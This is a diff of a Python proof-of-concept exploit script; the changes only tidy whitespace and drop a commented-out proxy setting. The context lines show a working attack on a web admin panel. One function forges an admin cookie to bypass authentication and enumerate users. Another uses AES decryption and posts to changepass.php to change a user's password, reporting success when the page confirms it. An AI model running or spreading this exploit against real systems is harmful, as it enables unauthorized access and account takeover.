@@ -5,21 +5,17 @@ import urllib3
 urllib3.disable_warnings()
 from bs4 import BeautifulSoup
 
+
 proxy = {
-    """
-    "http":"http://127.0.0.1:8080",
-    "https":"https://127.0.0.1:8080",
-    """
 }
+
 
 def check_poc1(url):
     header = {
         "Cookie": "admin_id=1; gw_admin_ticket=1;",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
     }
-
     found_users = []
-
     for id in range(1, 3): #The recommended id cannot exceed 5
         try:
             path = "/admin/group/x_group.php?id={}".format(id)
@@ -53,13 +49,13 @@ def check_poc1(url):
             f.close()
     else:
         print("No users found,Please check the network")
-
     return found_users
 
 
 from Crypto.Cipher import AES
 import base64
 import hashlib
+
 
 def aes_decrypt(key, ciphertext):
     cipher = AES.new(key, AES.MODE_ECB)
@@ -91,7 +87,6 @@ def check_poc2(url,password):
     path = "/changepass.php?type=2"
     try:
         r = requests.post(url + path, headers=header, data=body, proxies=proxy, verify=False, timeout=5)
-        #print(r.text)
         r.encoding = "utf-8"
         if r.status_code == 200 and "修改密码成功" in r.text:
             print("[*] Password changed successfully,URL: "+url+"\r")
